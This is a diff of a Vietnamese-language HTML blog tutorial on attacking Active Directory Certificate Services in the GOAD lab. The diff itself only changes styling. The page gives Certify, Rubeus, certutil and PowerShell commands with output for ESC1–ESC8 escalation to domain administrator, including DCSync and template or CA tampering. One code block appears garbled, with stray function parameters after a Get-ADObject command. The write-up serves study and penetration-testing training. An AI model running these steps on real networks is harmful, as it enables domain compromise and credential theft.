@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -165,9 +165,7 @@
     <main class="pt-20 container mx-auto px-4 sm:px-6 lg:px-8">
         <article class="max-w-4xl mx-auto py-16 fade-in">
             <header class="mb-12">
-                <img src="../breaking-active-directory-certificate-services-adcs/adcs_security.png" 
-                     alt="ADCS Security Banner" 
-                     class="rounded-lg shadow-lg mb-6">
+                <img src="../breaking-active-directory-certificate-services-adcs/adcs_security.png" alt="ADCS Security Banner" class="rounded-lg shadow-lg mb-6">
                 <h1 class="text-4xl md:text-6xl text-green-400 font-bold mb-4">Breaking Active Directory Certificate Services</h1>
                 <div class="flex items-center space-x-4 text-gray-400">
                     <time datetime="2025-06-12">Jun 12, 2025</time>
@@ -198,9 +196,9 @@
                                 lab environment. Domains được sử dụng bao gồm:
                             </p>
                             <ul class="list-disc list-inside mt-2 space-y-1">
-                                <li><code>essos.local</code></li>
-                                <li><code>sevenkingdoms.local</code></li>
-                                <li><code>north.sevenkingdoms.local</code></li>
+                                <li><code class="text-green-400">essos.local</code></li>
+                                <li><code class="text-green-400">sevenkingdoms.local</code></li>
+                                <li><code class="text-green-400">north.sevenkingdoms.local</code></li>
                             </ul>
                         </div>
                     </div>
@@ -285,7 +283,7 @@
                     <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                         <p>Trước khi bắt đầu tấn công, hãy hiểu điều gì làm cho ADCS khác biệt so với các dịch vụ Windows khác. ADCS triển khai một Hạ tầng Khóa Công khai (PKI) thường theo hệ thống phân cấp sau:</p>
 
-                        <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>Root CA (Offline)
+                        <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto"><code>Root CA (Offline)
     └── Subordinate CA (Online)
         └── Certificate Templates
             └── Issued Certificates</code>
@@ -304,7 +302,7 @@
                         <div class="space-y-4">
                             <p>Hãy xem điều này hoạt động như thế nào trong môi trường GOAD của chúng ta:</p>
 
-                            <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code># Discover ADCS servers in the environment
+                            <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto"><code># Discover ADCS servers in the environment
 nxc ldap 192.168.56.10-23 -u '' -p '' -M adcs
 
 SMB         192.168.56.12   445    MEEREEN          [*] Windows 10.0 Build 17763 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:False)
@@ -321,7 +319,7 @@ ADCS        192.168.56.23   -      BRAAVOS          Found CN=ESSOS-CA,CN=Enrollm
 
                             <div class="bg-yellow-900/30 border border-yellow-500 p-4 rounded-lg">
                                 <h4 class="text-yellow-400 font-semibold mb-2">⚠️ Lưu ý Quan Trọng</h4>
-                                <p>Để đảm bảo độ chính xác và tránh các vấn đề không khớp chứng chỉ, luôn cung cấp tham số <code>/sid</code> - đó là SID của người dùng mục tiêu.</p>
+                                <p>Để đảm bảo độ chính xác và tránh các vấn đề không khớp chứng chỉ, luôn cung cấp tham số <code class="text-green-400">/sid</code> - đó là SID của người dùng mục tiêu.</p>
                             </div>
                         </div>
                     </div>
@@ -341,7 +339,7 @@ ADCS        192.168.56.23   -      BRAAVOS          Found CN=ESSOS-CA,CN=Enrollm
                         </ul>
 
                         <p>
-                            Điều làm cho các mẫu này trở nên nguy hiểm là - chúng thường cho phép quyền truy cập nhiều hơn mức mà các quản trị viên nhận ra. Hãy xem chúng ta tìm thấy gì trong GOAD, và liệt kê các mẫu chứng chỉ với lệnh <code>Certify.exe find /vulnerable</code>
+                            Điều làm cho các mẫu này trở nên nguy hiểm là - chúng thường cho phép quyền truy cập nhiều hơn mức mà các quản trị viên nhận ra. Hãy xem chúng ta tìm thấy gì trong GOAD, và liệt kê các mẫu chứng chỉ với lệnh <code class="text-green-400">Certify.exe find /vulnerable</code>
                             . Lệnh này cho chúng ta thấy một số mẫu chứng chỉ dễ bị tổn thương trong môi trường GOAD. Bây giờ hãy đi sâu vào việc khai thác chúng.
                         </p>
                     </div>
@@ -360,9 +358,9 @@ ADCS        192.168.56.23   -      BRAAVOS          Found CN=ESSOS-CA,CN=Enrollm
                                 <p class="mb-4">Vulnerability xảy ra khi một mẫu chứng chỉ có:</p>
                                 
                                 <ol class="list-decimal list-inside space-y-2 ml-4">
-                                    <li>Flag <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> được bật</li>
-                                    <li><code>Client Authentication</code> hoặc <code>Any Purpose</code> EKU</li>
-                                    <li>Quyền đăng ký cho <code>Domain Users</code></li>
+                                    <li>Flag <code class="text-green-400">CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> được bật</li>
+                                    <li><code class="text-green-400">Client Authentication</code> hoặc <code class="text-green-400">Any Purpose</code> EKU</li>
+                                    <li>Quyền đăng ký cho <code class="text-green-400">Domain Users</code></li>
                                     <li>Không yêu cầu phê duyệt của quản lý</li>
                                 </ol>
                             </div>
@@ -371,7 +369,7 @@ ADCS        192.168.56.23   -      BRAAVOS          Found CN=ESSOS-CA,CN=Enrollm
                                 <h3 class="text-xl text-green-400 font-semibold mb-4">Quy Trình Khai Thác</h3>
                                 <p class="mb-4">Đầu tiên, hãy liệt kê các mẫu dễ bị tổn thương trong lab GOAD của chúng ta:</p>
                                 
-                                <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject
+                                <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto"><code>Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject
 
 [*] Action: Find certificate templates
 [*] Using current user's unrolled group SID list for cross-references
@@ -407,21 +405,21 @@ ADCS        192.168.56.23   -      BRAAVOS          Found CN=ESSOS-CA,CN=Enrollm
                                 <div class="mt-4">
                                     <p class="mb-2">Hoàn hảo! Đầu ra này xác nhận:</p>
                                     <ul class="list-disc list-inside ml-4 space-y-2">
-                                        <li><code>ESSOS\Domain Users</code> có quyền đăng ký trên mẫu "ESC1"</li>
+                                        <li><code class="text-green-400">ESSOS\Domain Users</code> có quyền đăng ký trên mẫu "ESC1"</li>
                                         <li>Mẫu cho phép người đăng ký cung cấp chủ thể</li>
-                                        <li><em>Lưu ý: <code>missandei</code> cũng có quyền kiểm soát đối tượng</em></li>
+                                        <li><em>Lưu ý: <code class="text-green-400">missandei</code> cũng có quyền kiểm soát đối tượng</em></li>
                                     </ul>
                                 </div>
                             </div>
 
                             <div class="bg-yellow-900/30 border border-yellow-500 p-4 rounded-lg">
                                 <h4 class="text-yellow-400 font-semibold mb-2">⚠️ Lưu ý Quan Trọng</h4>
-                                <p>Để đảm bảo độ chính xác và tránh các vấn đề không khớp chứng chỉ, luôn cung cấp tham số <code>/sid</code> - đó là SID của người dùng mục tiêu.</p>
+                                <p>Để đảm bảo độ chính xác và tránh các vấn đề không khớp chứng chỉ, luôn cung cấp tham số <code class="text-green-400">/sid</code> - đó là SID của người dùng mục tiêu.</p>
                             </div>
 
                             <div class="space-y-4">
                                 <h4 class="text-lg text-green-400 font-semibold">Bước 1: Yêu cầu chứng chỉ với quyền admin</h4>
-                                <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC1 /altname:essos\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500
+                                <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC1 /altname:essos\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500
 
 [*] Action: Request a Certificates
 [*] Current user context    : ESSOS\missandei
@@ -452,16 +450,16 @@ MIIEpAIBAAKCAQEA2hT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW
 
                                 <div class="bg-gray-900/50 p-4 rounded-lg space-y-4">
                                     <p><strong>Phương pháp 1: OpenSSL (đa nền tảng)</strong></p>
-                                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>openssl pkcs12 -in cert.pem -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out administrator.pfx</code></pre>
+                                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto"><code>openssl pkcs12 -in cert.pem -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out administrator.pfx</code></pre>
                                 
                                     <p><strong>Phương pháp 2: Certutil (Windows)</strong></p>
-                                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>certutil -MergePFX .\cert.pem .\administrator.pfx</code></pre>
+                                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto"><code>certutil -MergePFX .\cert.pem .\administrator.pfx</code></pre>
                                 </div>
                             </div>
 
                             <div class="space-y-4">
                                 <h4 class="text-lg text-green-400 font-semibold">Bước 3: Xác thực với Rubeus</h4>
-                                <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code># Nhận NTLM Hash trực tiếp
+                                <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto"><code># Nhận NTLM Hash trực tiếp
 Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /getcredentials
 
 # Hoặc nhận TGT
@@ -506,7 +504,7 @@ Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /password:m
 
                             <div class="space-y-4">
                                 <h4 class="text-lg text-green-400 font-semibold">Bước 4: Thực hiện DCSync</h4>
-                                <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6...
+                                <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto"><code>Rubeus.exe ptt /ticket:doIFujCCBbagAwIBBaEDAgEWooIEwjCCBL5hggS6...
 
 [*] Action: Import Ticket
 [+] Ticket successfully imported!
@@ -547,7 +545,7 @@ Credentials:
 
                             <div class="space-y-4">
                                 <h4 class="text-lg text-green-400 font-semibold">Kỹ Thuật Nâng Cao</h4>
-                                <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code># Sử dụng tham số /sid để tăng độ chính xác
+                                <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto"><code># Sử dụng tham số /sid để tăng độ chính xác
 Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC1 /altname:essos\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500
 
 # Hoặc sử dụng Flag /getcredentials để trích xuất hash NTLM trực tiếp
@@ -593,7 +591,7 @@ Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Khai Thác</h3>
                     <p>Hãy kiểm tra các mẫu ESC2 trong GOAD:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe find /vulnerable
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe find /vulnerable
 
 [!] Vulnerable Certificates Templates :
 
@@ -615,7 +613,7 @@ Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject
                     <p>Trong GOAD gốc, mẫu ESC2 được sao chép từ mẫu Người dùng tích hợp sẵn và chỉ giữ lại EKU Any-Purpose (không có Flag ENROLLEE_SUPPLIES_SUBJECT). Nếu lab của bạn hiển thị Flag này, đó là sự kết hợp của ESC1 + AnyPurpose.</p>
                     
                     <p>Bây giờ yêu cầu chứng chỉ với Any Purpose EKU (như chính bạn)</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC2
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC2
 
 [*] Action: Request a Certificates
 [*] Current user context    : ESSOS\missandei
@@ -634,7 +632,7 @@ MIIEpAIBAAKCAQEA3kT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW
 </code></pre>
                     
                     <p>Sử dụng chứng chỉ cho xác thực khách hàng (như người yêu cầu)</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Rubeus.exe asktgt /user:missandei /certificate:anypurpose.pfx /password:mimikatz
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Rubeus.exe asktgt /user:missandei /certificate:anypurpose.pfx /password:mimikatz
 
 [*] Action: Ask TGT
 [*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
@@ -665,7 +663,7 @@ MIIEpAIBAAKCAQEA3kT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW
                     
                     <p>Bước 1: Yêu cầu chứng chỉ Enrollment Agent
 Mẫu tích hợp sẵn được gọi là "EnrollmentAgent" - sao chép nó thành ESC3-CRA cho lab của bạn nếu cần</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:EnrollmentAgent
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:EnrollmentAgent
 
 [*] Action: Request a Certificates
 [*] Current user context    : ESSOS\khal.drogo
@@ -684,7 +682,7 @@ MIIEowIBAAKCAQEAzGQ5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEz
 </code></pre>
                     
                     <p>Bước 2: Sử dụng chứng chỉ đại lý để yêu cầu chứng chỉ cho Quản trị viên Miền</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /onbehalfof:ESSOS\administrator /enrollcert:agent.pfx /enrollcertpw:mimikatz
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /onbehalfof:ESSOS\administrator /enrollcert:agent.pfx /enrollcertpw:mimikatz
 
 [*] Action: Request a Certificates on behalf of another user
 [*] Current user context    : ESSOS\khal.drogo
@@ -704,7 +702,7 @@ MIIEowIBAAKCAQEA8Fj9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEzGCq5VJXpF8rTQ
 </code></pre>
                     
                     <p>Bước 3: Xác thực dưới danh nghĩa quản trị viên</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Rubeus.exe asktgt /user:administrator /certificate:admin.pfx
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Rubeus.exe asktgt /user:administrator /certificate:admin.pfx
 
 [*] Action: Ask TGT
 [*] Using PKINIT with etype rc4_hmac and subject: CN=administrator, CN=Users, DC=essos, DC=local
@@ -721,8 +719,8 @@ MIIEowIBAAKCAQEA8Fj9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEzGCq5VJXpF8rTQ
 </code></pre>
                     
                     <p>
-                        Hoàn hảo! Chúng tôi đã nâng cấp từ <code>khal.drogo</code>
-                        lên <code>administrator</code>
+                        Hoàn hảo! Chúng tôi đã nâng cấp từ <code class="text-green-400">khal.drogo</code>
+                        lên <code class="text-green-400">administrator</code>
                         bằng cách sử dụng kỹ thuật ESC3.
                     </p>
                     </div>
@@ -747,7 +745,7 @@ MIIEowIBAAKCAQEA8Fj9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEzGCq5VJXpF8rTQ
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Triển Khai Thực Tế</h3>
                     <p>Hãy xem chúng ta có thể sửa đổi gì trong GOAD. Tìm các mẫu có ACL dễ bị tổn thương:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe find /vulnerable
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe find /vulnerable
 
 [!] Vulnerable Certificates Templates :
 
@@ -809,7 +807,7 @@ Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag
                     
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Sửa Đổi Mẫu PowerShell</h3>
                     <p>Đây là một kịch bản mạnh mẽ hơn để sửa đổi mẫu trong môi trường GOAD:</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>function Modify-CertificateTemplate {
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>function Modify-CertificateTemplate {
     param(
         [string]$TemplateName,
         [switch]$EnableSubjectAltName,
@@ -874,7 +872,7 @@ Modify-CertificateTemplate -TemplateName "ESC4" -Restore -Domain "essos.local"
                     
                     <p>Hãy kiểm tra những gì chúng ta có trong GOAD. Kiểm tra quyền của đối tượng CA trong miền essos.local:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Get-ADObject "CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties nTSecurityDescriptor
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Get-ADObject "CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties nTSecurityDescriptor
         [switch]$EnableSubjectAltName,
         [switch]$Restore,
         [string]$Domain = "essos.local"
@@ -937,7 +935,7 @@ Modify-CertificateTemplate -TemplateName "ESC4" -Restore -Domain "essos.local"
                     
                     <p>Hãy kiểm tra những gì chúng ta có trong GOAD. Kiểm tra quyền của đối tượng CA trong miền essos.local:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Get-ADObject "CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties nTSecurityDescriptor
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Get-ADObject "CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties nTSecurityDescriptor
 
 DistinguishedName : CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
 Name              : ESSOS-CA
@@ -950,14 +948,14 @@ ObjectGUID        : 4f8bd644-2c29-418c-93f1-fe926f91f6b4
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Thay Đổi Cấu Hình CA</h3>
                     <p>Nếu bạn có quyền WriteProperty, hãy sửa đổi cài đặt CA. Bật SAN trong các chứng chỉ được phát hành:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
 
 CertUtil: -setreg command completed successfully.
 The command completed successfully.
 </code></pre>
                     
                     <p>Khởi động lại dịch vụ chứng chỉ để áp dụng thay đổi</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>net stop certsvc &#x26;&#x26;net start certsvc
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>net stop certsvc &#x26;&#x26;net start certsvc
 
 The Certificate Services service is stopping.
 The Certificate Services service was stopped successfully.
@@ -969,7 +967,7 @@ Start-Sleep -Seconds 10
 </code></pre>
                     
                     <p>Bây giờ chúng ta có thể yêu cầu chứng chỉ với SAN từ bất kỳ mẫu nào:</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:upn:administrator@essos.local
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:upn:administrator@essos.local
 
 [*] Action: Request a Certificates
 [*] Current user context    : ESSOS\khal.drogo
@@ -985,7 +983,7 @@ Start-Sleep -Seconds 10
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Tạo Mẫu Chứng Chỉ</h3>
                     <p>Nếu bạn có GenericWrite trên container Mẫu Chứng chỉ trong GOAD, hãy tạo một mẫu dễ bị tổn thương mới:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>$templateDN = "CN=EvilTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>$templateDN = "CN=EvilTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"
 
 # Template with dangerous settings for GOAD environment
 New-ADObject -Name "EvilTemplate" -Type "pKICertificateTemplate" -Path "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -OtherAttributes @{
@@ -1018,7 +1016,7 @@ ObjectClass               : pKICertificateTemplate
                     <h2 class="text-2xl text-green-400 font-bold mb-6">ESC6: Khai Thác Cài Đặt EDITF_ATTRIBUTESUBJECTALTNAME2</h2>
                     <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                     <p>
-                        ESC6 khai thác Flag <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code>
+                        ESC6 khai thác Flag <code class="text-green-400">EDITF_ATTRIBUTESUBJECTALTNAME2</code>
                         trên CA, cho phép chỉ định SAN trong bất kỳ yêu cầu chứng chỉ nào.
                     </p>
                     
@@ -1031,7 +1029,7 @@ ObjectClass               : pKICertificateTemplate
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Kiểm Tra Lỗ Hổng</h3>
                     <p>Hãy kiểm tra cấu hình CA trong GOAD. Kiểm tra xem Flag này có được thiết lập trên ESSOS-CA hay không:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags
 
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\ESSOS-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags REG_DWORD = 0x144120 (1327392)
 
@@ -1052,7 +1050,7 @@ CertUtil: -getreg command completed successfully.
                     
                     <p>Tìm các CA có Flag EDITF_ATTRIBUTESUBJECTALTNAME2 được thiết lập:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe find /vulnerable
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe find /vulnerable
 
 [!] Vulnerable Certificates Templates :
 [!] Certificate Authority has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set!
@@ -1066,7 +1064,7 @@ CertUtil: -getreg command completed successfully.
 </code></pre>
                     
                     <p>Yêu cầu chứng chỉ với SAN tùy ý bằng cách sử dụng bất kỳ mẫu nào:</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:administrator@essos.local
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:administrator@essos.local
 
 [*] Action: Request a Certificates
 [*] Current user context    : ESSOS\missandei
@@ -1082,13 +1080,13 @@ CertUtil: -getreg command completed successfully.
                     <p>Mặc dù mẫu không cho phép chỉ định chủ thể,
 ESC6 cho phép điều này thông qua cấu hình CA</p>
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Bật Flag (nếu bạn có quyền quản trị CA). Bật Flag nguy hiểm trên GOAD CA:</h3>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
 
 CertUtil: -setreg command completed successfully.
 </code></pre>
                     
                     <p>Khởi động lại dịch vụ chứng chỉ:</p>
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Restart-Service CertSvc
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Restart-Service CertSvc
 
 WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to stop...
 WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to start...
@@ -1107,7 +1105,7 @@ Running  CertSvc            Active Directory Certificate Services
                     
                     <p>Hãy xem chúng ta có quyền gì trong GOAD. Kiểm tra xem chúng ta có quyền ManageCA hay không:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe find /vulnerable
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe find /vulnerable
 
 [!] Vulnerable Certificates Templates :
 
@@ -1128,7 +1126,7 @@ Running  CertSvc            Active Directory Certificate Services
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Khai Thác Quyền ManageCA</h3>
                     <p>Quyền ManageCA giống như có chìa khóa cho vương quốc. Dưới đây là những gì bạn có thể làm:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Nếu bạn có ManageCA, bạn có thể:
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Nếu bạn có ManageCA, bạn có thể:
 # 1. Bật Flag EDITF_ATTRIBUTESUBJECTALTNAME2
 certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
 
@@ -1154,7 +1152,7 @@ Running  CertSvc            Active Directory Certificate Services
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Khai Thác Quyền ManageCertificates</h3>
                     <p>Với quyền ManageCertificates, phê duyệt các yêu cầu đang chờ. Đầu tiên, gửi một yêu cầu cho người dùng có đặc quyền bằng cách sử dụng mẫu SubCA:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:SubCA /altname:administrator@essos.local
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:SubCA /altname:administrator@essos.local
 
 [*] Action: Request a Certificates
 [*] Current user context    : ESSOS\viserys.targaryen
@@ -1198,7 +1196,7 @@ Certify.exe request /ca:braavos.essos.local\ESSOS-CA /retrieve 14
                         </li>
                         <li>
                             <strong>Điểm cuối đăng ký HTTP</strong>
-                            có thể truy cập tại <code>http://braavos.essos.local/certsrv/</code>
+                            có thể truy cập tại <code class="text-green-400">http://braavos.essos.local/certsrv/</code>
                         </li>
                         <li>
                             Chúng ta có thể thực hiện các cuộc tấn công <strong>NTLM relay</strong>
@@ -1210,7 +1208,7 @@ Certify.exe request /ca:braavos.essos.local\ESSOS-CA /retrieve 14
                     <h3 class="text-xl text-green-400 font-semibold mb-4">Triển Khai Tấn Công</h3>
                     <p>Hãy kiểm tra điểm cuối đăng ký web trước:</p>
                     
-                    <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Check if ADCS web enrollment is accessible
+                    <pre class="bg-gray-900 text-blue-400 p-4 rounded-lg overflow-x-auto mb-4"><code># Check if ADCS web enrollment is accessible
 curl -I http://braavos.essos.local/certsrv/certfnsh.asp
 
 HTTP/1.1 401 Unauthorized
@@ -1224,7 +1222,7 @@ Date: Thu, 03 Jan 2025 16:45:12 GMT
                     
